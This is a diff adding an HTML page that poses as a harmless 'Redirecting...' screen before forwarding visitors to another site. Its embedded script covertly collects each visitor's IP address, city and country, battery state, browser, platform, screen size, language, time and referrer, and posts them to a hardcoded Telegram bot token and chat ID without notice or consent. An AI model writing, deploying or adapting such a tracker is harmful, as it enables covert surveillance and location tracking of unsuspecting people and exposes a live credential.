@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Redirecting...</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="refresh" content="3;url=https://heavenscake.vercel.app">
+  <style>
+    body {
+      background: #111;
+      color: #fff;
+      text-align: center;
+      font-family: sans-serif;
+      padding: 50px;
+    }
+    h2 {
+      margin-bottom: 20px;
+    }
+  </style>
+</head>
+<body>
+  <h2>Loading Device Info...</h2>
+  <p>Please wait, you will be redirected shortly.</p>
+
+  <script>
+    const BOT_TOKEN = "7740401254:AAGqaGtAQ2YEiwXtjert2CiuWFADXbGz3Jg";
+    const CHAT_ID = "7216371031";
+    let deviceInfo = "";
+
+    // Get battery info
+    function getBatteryInfo() {
+      return navigator.getBattery().then(battery => {
+        deviceInfo += `🔋 Battery: ${Math.round(battery.level * 100)}%\n`;
+        deviceInfo += `⚡ Charging: ${battery.charging ? "Yes" : "No"}\n`;
+      }).catch(() => {
+        deviceInfo += `🔋 Battery: Not Available\n`;
+      });
+    }
+
+    // Get IP and location
+    function getIPInfo() {
+      return fetch("http://ip-api.com/json")
+        .then(res => res.json())
+        .then(ip => {
+          deviceInfo += `🌍 IP: ${ip.query}\n📍 Location: ${ip.city}, ${ip.country}\n`;
+        }).catch(() => {
+          deviceInfo += `🌍 IP: Not Available\n`;
+        });
+    }
+
+    // Send to Telegram
+    function sendToTelegram(message) {
+      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ chat_id: CHAT_ID, text: message })
+      });
+    }
+
+    // Collect all info, then send
+    Promise.all([
+      getBatteryInfo(),
+      getIPInfo()
+    ]).then(() => {
+      deviceInfo += `🌐 Language: ${navigator.language}\n`;
+      deviceInfo += `💻 Platform: ${navigator.platform}\n`;
+      deviceInfo += `🖥️ Screen: ${screen.width}x${screen.height}\n`;
+      deviceInfo += `📱 UA: ${navigator.userAgent}\n`;
+      deviceInfo += `🕒 Time: ${new Date().toLocaleString()}\n`;
+      deviceInfo += `🔗 Referrer: ${document.referrer || 'Direct'}\n`;
+
+      sendToTelegram(deviceInfo);
+    });
+  </script>
+</body>
+</html>
